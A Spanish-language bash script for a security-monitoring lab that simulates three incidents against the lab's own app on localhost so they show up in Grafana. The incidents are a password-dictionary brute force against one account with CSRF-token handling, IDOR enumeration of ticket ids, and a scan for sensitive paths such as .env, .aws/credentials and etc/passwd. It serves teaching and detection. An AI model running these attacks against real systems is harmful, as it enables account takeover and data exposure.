#!/usr/bin/env bash
# Simula incidentes de seguridad contra «producción» para verlos en Grafana.
# Producción no publica su puerto al host, así que el script corre DENTRO de jenkins-p3:
#
#   docker exec -i jenkins-p3 bash -s fuerza-bruta < monitoreo/incidentes.sh
#   docker exec -i jenkins-p3 bash -s enumeracion  < monitoreo/incidentes.sh
#   docker exec -i jenkins-p3 bash -s escaneo      < monitoreo/incidentes.sh
#
# Solo para el laboratorio: ataca la app propia en localhost, nunca un sistema ajeno.
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:8000}"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT

# Un atacante real también lee el token CSRF del formulario antes de cada POST.
token_csrf() {
    curl -s -c "$JAR" -b "$JAR" "$BASE/login" \
        | grep -o 'name="csrf_token" value="[^"]*"' | sed 's/.*value="//; s/"$//'
}

login() {  # login <usuario> <clave> → imprime el código HTTP
    local t; t="$(token_csrf)"
    curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -b "$JAR" \
        --data-urlencode "csrf_token=$t" --data-urlencode "username=$1" \
        --data-urlencode "password=$2" "$BASE/login"
}

case "${1:-}" in
  fuerza-bruta)
    # Incidente 1 (OWASP A07): diccionario de claves contra la cuenta de «ana».
    echo "== Fuerza bruta: 20 claves contra «ana»"
    for clave in 123456 password qwerty ana ana2024 admin letmein 111111 abc123 iloveyou \
                 ana1234 Ana123 ana12345 contraseña chile2026 duoc123 secreto ana_ana 000000 welcome; do
        echo "  $clave → HTTP $(login ana "$clave")"
        sleep 1
    done ;;

  enumeracion)
    # Incidente 2 (OWASP A01): un usuario válido recorre ids buscando tickets ajenos (IDOR).
    echo "== Enumeración de tickets como «bruno» (ids 1–40)"
    [ "$(login bruno bruno123)" = 302 ] || { echo "no pude entrar como bruno"; exit 1; }
    for id in $(seq 1 40); do
        printf '  /tickets/%s → %s\n' "$id" "$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" "$BASE/tickets/$id")"
        sleep 0.3
    done ;;

  escaneo)
    # Incidente 3 (reconocimiento): rutas típicas que prueban los escáneres automáticos.
    echo "== Escaneo de rutas sensibles"
    for ruta in .env .git/config admin wp-login.php phpmyadmin config.php backup.zip \
                server-status .aws/credentials api/v1/users debug console actuator/env \
                db.sqlite securedev.db static/../app.py robots.txt sitemap.xml .DS_Store \
                login.php admin/login cgi-bin/test.cgi etc/passwd; do
        printf '  /%s → %s\n' "$ruta" "$(curl -s -o /dev/null -w '%{http_code}' "$BASE/$ruta")"
        sleep 0.3
    done ;;

  *) echo "uso: incidentes.sh fuerza-bruta | enumeracion | escaneo"; exit 2 ;;
esac
